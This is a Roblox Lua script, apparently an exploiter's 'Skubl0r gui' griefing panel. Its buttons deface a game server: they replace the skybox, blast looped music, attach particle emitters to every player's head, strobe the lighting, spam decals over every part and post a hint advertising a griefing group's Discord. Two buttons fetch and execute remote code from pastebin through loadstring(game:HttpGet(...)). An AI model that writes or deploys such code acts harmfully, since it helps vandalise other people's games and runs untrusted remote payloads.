-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextButton_4 = Instance.new("TextButton")
local TextButton_5 = Instance.new("TextButton")
local TextButton_6 = Instance.new("TextButton")
local TextButton_7 = Instance.new("TextButton")
local TextButton_8 = Instance.new("TextButton")
local TextButton_9 = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local ImageLabel_2 = Instance.new("ImageLabel")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.618990362, 0, 0.57407409, 0)
Frame.Size = UDim2.new(0, 358, 0, 250)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
TextLabel.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.BorderSizePixel = 3
TextLabel.Size = UDim2.new(0, 358, 0, 38)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Skubl0r gui"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 30.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton.BorderSizePixel = 3
TextButton.Position = UDim2.new(0, 0, 0.150197759, 0)
TextButton.Size = UDim2.new(0, 110, 0, 40)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "skybox"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 30.000
TextButton.MouseButton1Click:Connect(function()
	
end)


TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_2.BorderSizePixel = 3
TextButton_2.Position = UDim2.new(0.308673531, 0, 0.150197759, 0)
TextButton_2.Size = UDim2.new(0, 125, 0, 40)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "music"
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextSize = 30.000
TextButton_2.MouseButton1Click:Connect(function()
	
end)

TextButton_3.Parent = Frame
TextButton_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_3.BorderSizePixel = 3
TextButton_3.Position = UDim2.new(0.658163249, 0, 0.150197759, 0)
TextButton_3.Size = UDim2.new(0, 122, 0, 40)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "particles"
TextButton_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.TextSize = 30.000
TextButton_3.MouseButton1Click:Connect(function()
	
end)

TextButton_4.Parent = Frame
TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_4.BorderSizePixel = 3
TextButton_4.Position = UDim2.new(0, 0, 0.310197741, 0)
TextButton_4.Size = UDim2.new(0, 110, 0, 40)
TextButton_4.Font = Enum.Font.SourceSans
TextButton_4.Text = "disco"
TextButton_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.TextSize = 30.000
TextButton_4.MouseButton1Click:Connect(function()
	
end)

TextButton_5.Parent = Frame
TextButton_5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_5.BorderSizePixel = 3
TextButton_5.Position = UDim2.new(0.308673531, 0, 0.310197741, 0)
TextButton_5.Size = UDim2.new(0, 125, 0, 40)
TextButton_5.Font = Enum.Font.SourceSans
TextButton_5.Text = "hint message"
TextButton_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.TextSize = 27.000
TextButton_5.MouseButton1Click:Connect(function()
	
end)

TextButton_6.Parent = Frame
TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_6.BorderSizePixel = 3
TextButton_6.Position = UDim2.new(0.658163249, 0, 0.310197741, 0)
TextButton_6.Size = UDim2.new(0, 122, 0, 40)
TextButton_6.Font = Enum.Font.SourceSans
TextButton_6.Text = "decal spam"
TextButton_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.TextSize = 30.000
TextButton_6.MouseButton1Click:Connect(function()
	
end)

TextButton_7.Parent = Frame
TextButton_7.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_7.BorderSizePixel = 3
TextButton_7.Position = UDim2.new(0, 0, 0.470197767, 0)
TextButton_7.Size = UDim2.new(0, 110, 0, 40)
TextButton_7.Font = Enum.Font.SourceSans
TextButton_7.Text = "upde!!!"
TextButton_7.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.TextSize = 30.000
TextButton_7.MouseButton1Click:Connect(function()
	
end)

TextButton_8.Parent = Frame
TextButton_8.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_8.BorderSizePixel = 3
TextButton_8.Position = UDim2.new(0.308673531, 0, 0.470197767, 0)
TextButton_8.Size = UDim2.new(0, 125, 0, 40)
TextButton_8.Font = Enum.Font.SourceSans
TextButton_8.Text = "grabv2"
TextButton_8.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.TextSize = 30.000
TextButton_8.MouseButton1Click:Connect(function()
	
end)

TextButton_9.Parent = Frame
TextButton_9.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.BorderColor3 = Color3.fromRGB(255, 0, 0)
TextButton_9.BorderSizePixel = 3
TextButton_9.Position = UDim2.new(0.655369937, 0, 0.470197767, 0)
TextButton_9.Size = UDim2.new(0, 122, 0, 40)
TextButton_9.Font = Enum.Font.SourceSans
TextButton_9.Text = "devuzi"
TextButton_9.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.TextSize = 30.000
TextButton_9.MouseButton1Click:Connect(function()
	
end)

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.854748607, 0, 0, 0)
ImageLabel.Size = UDim2.new(0, 52, 0, 38)
ImageLabel.Image = "rbxassetid://358313209"

ImageLabel_2.Parent = Frame
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BorderColor3 = Color3.fromRGB(255, 0, 0)
ImageLabel_2.BorderSizePixel = 3
ImageLabel_2.Position = UDim2.new(0, 0, 0.628000021, 0)
ImageLabel_2.Size = UDim2.new(0, 356, 0, 93)
ImageLabel_2.Image = "http://www.roblox.com/asset/?id=358313209"

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.21787709, 0, 0.856000006, 0)
TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "totally not skidded gui -by LordMuhamad and debby"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 20.000

-- Scripts:

local function ZIAGH_fake_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	script.Parent.MouseButton1Click:Connect(function()
	
		h = Instance.new("Sky") --Inserts A Skybox
		h.Parent=game.Lighting --Puts the skybox into lighting
		h.SkyboxBk="http://www.roblox.com/asset/?id=358313209" --All Below Set The Skybox
		h.SkyboxFt="http://www.roblox.com/asset/?id=358313209"
		h.SkyboxLf="http://www.roblox.com/asset/?id=358313209"
		h.SkyboxRt="http://www.roblox.com/asset/?id=358313209"
		h.SkyboxUp="http://www.roblox.com/asset/?id=358313209"
	end)
end
coroutine.wrap(ZIAGH_fake_script)()
local function QQAJ_fake_script() -- TextButton_2.Script 
	local script = Instance.new('Script', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
	local s = Instance.new("Sound")
	
	s.Name = "Sound"
	s.SoundId = "http://www.roblox.com/asset/?id=1837301451"
	s.Volume = 100
	s.Looped = true
	s.archivable = false
	
	s.Parent = game.Workspace
	
	wait(1)
	
	s:play()
	
	end)
end
coroutine.wrap(QQAJ_fake_script)()
local function KNNAVN_fake_script() -- TextButton_3.Script 
	local script = Instance.new('Script', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		for i, v in pairs(game.Players:GetChildren()) do
			emit = Instance.new("ParticleEmitter")
			emit.Parent = v.Character.Head
			emit.Texture = "http://www.roblox.com/asset/?id=358313209"
			emit.VelocitySpread = 100000
		end
		end)
end
coroutine.wrap(KNNAVN_fake_script)()
local function METT_fake_script() -- TextButton_4.Script 
	local script = Instance.new('Script', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		local Lighting = game:GetService("Lighting")
		local ColorCorrection = Instance.new("ColorCorrectionEffect", Lighting)
	
		function zigzag(X) 
			return math.acos(math.cos(X*math.pi))/math.pi
		end
	
		Counter = 0
	
		Lighting.TimeOfDay = "19:00"
	
		while wait(0.1) do 
			ColorCorrection.TintColor = Color3.fromHSV(zigzag(Counter),1,1)
			Lighting.Ambient = Color3.fromHSV(zigzag(Counter),1,1)
			Counter += 0.01
		end
	end)
end
coroutine.wrap(METT_fake_script)()
local function BVJUXQ_fake_script() -- TextButton_5.Script 
	local script = Instance.new('Script', TextButton_5)

	script.Parent.MouseButton1Click:Connect(function()
	local m = Instance.new("Hint", game.workspace)
		m.Text = " JOIN TEAM C00LKIDD TODAY! https://discord.gg/kPY4bnQc"
		end)
end
coroutine.wrap(BVJUXQ_fake_script)()
local function BGZJ_fake_script() -- TextButton_6.Script 
	local script = Instance.new('Script', TextButton_6)

	script.Parent.MouseButton1Click:Connect(function()
	
		local DecalToSpam = "http://www.roblox.com/asset/?id=358313209" --Change the Id to yours
		local Workspace = game:GetService("Workspace")
		local Options = {"Front", "Back", "Bottom", "Left", "Right", "Top"}
	
		for _, Part in pairs(Workspace:GetDescendants()) do
			if Part:IsA("BasePart") and Part.Name ~= "Terrain" and Part.Name ~= "Camera" then
				for i = 1, #Options do
					local NewDecal = Instance.new("Decal")
					NewDecal.Texture = DecalToSpam
					NewDecal.ZIndex = 10
					NewDecal.Face = Options[i]
					NewDecal.Parent = Part
				end
			end
		end
	end)
end
coroutine.wrap(BGZJ_fake_script)()
local function ZDOMF_fake_script() -- TextButton_8.Script 
	local script = Instance.new('Script', TextButton_8)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/Bw7aWTBL"))()
	end)
end
coroutine.wrap(ZDOMF_fake_script)()
local function DOFD_fake_script() -- TextButton_9.LocalScript 
	local script = Instance.new('LocalScript', TextButton_9)

	print("Hello world!")
	
end
coroutine.wrap(DOFD_fake_script)()
local function VAWGKX_fake_script() -- TextButton_9.Script 
	local script = Instance.new('Script', TextButton_9)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/X2n20xqM"))()
	end)
end
coroutine.wrap(VAWGKX_fake_script)()
local function XNPWFSX_fake_script() -- Frame.DraggableGUI 
	local script = Instance.new('LocalScript', Frame)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			if gui.Visible then
				update(input)
			end
		end
	end)
end
coroutine.wrap(XNPWFSX_fake_script)()